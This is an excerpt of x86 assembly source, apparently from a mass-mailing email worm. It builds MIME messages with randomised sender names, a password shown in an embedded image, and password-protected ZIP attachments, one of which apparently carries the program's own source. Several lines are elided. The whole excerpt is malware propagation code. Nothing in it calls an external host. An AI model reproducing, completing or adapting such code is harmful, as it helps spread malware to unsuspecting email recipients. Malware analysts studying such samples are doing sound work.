...
EmailRandomName proc
        invoke  EmailRandomCommon, offset szNames1, addr dwNamesCount
        ret
...
EmailFormatMessage proc From, To: DWORD
        ...
        ; Main header
        invoke  EmailFormatHeader, ToName, To, FromName, From, addr lpBoundary, szSubject, szHeader1
        invoke  lstrlen, szHeader1
        coinvoke stream, IStream, Write, szHeader1, eax, NULL

        ; Message header boundary
        invoke  wsprintf, szHeader1, offset TxtHeader, addr lpBoundary
        invoke  lstrlen, szHeader1
        coinvoke stream, IStream, Write, szHeader1, eax, NULL
        ...
        .IF     byte ptr[eax]
                ...
                invoke  wsprintf, szHeader1, offset ImgPassHeader, addr lpBoundary, b64PasswordMime, addr lpPassName, edx, addr lpPassName, edx, addr lpPassName, edx
                invoke  lstrlen, szHeader1
                coinvoke stream, IStream, Write, szHeader1, eax, NULL
        ...
        ; File header
        invoke  EmailRandomName
        invoke  wsprintf, szHeader1, offset ZipHeader, addr lpBoundary, eax, szAttachExt, eax, szAttachExt
        invoke  lstrlen, szHeader1
        coinvoke stream, IStream, Write, szHeader1, eax, NULL
		...
		coinvoke stream, IStream, Write, offset szTextCRLF, 2, NULL
        	...
        	; File header
        	invoke  wsprintf, szHeader1, offset ZipHeader, addr lpBoundary, offset szSrcAttachName, offset szSrcAttachExt, offset szSrcAttachName, offset szSrcAttachExt
        	invoke  lstrlen, szHeader1
        	coinvoke stream, IStream, Write, szHeader1, eax, NULL
        ...
        ; Final boundary
        invoke  wsprintf, szHeader1, offset ZipBoundaryHdr, addr lpBoundary
        invoke  lstrlen, szHeader1
        coinvoke stream, IStream, Write, szHeader1, eax, NULL

        invoke  GlobalFree, szMessage
        invoke  GlobalFree, szHeader1
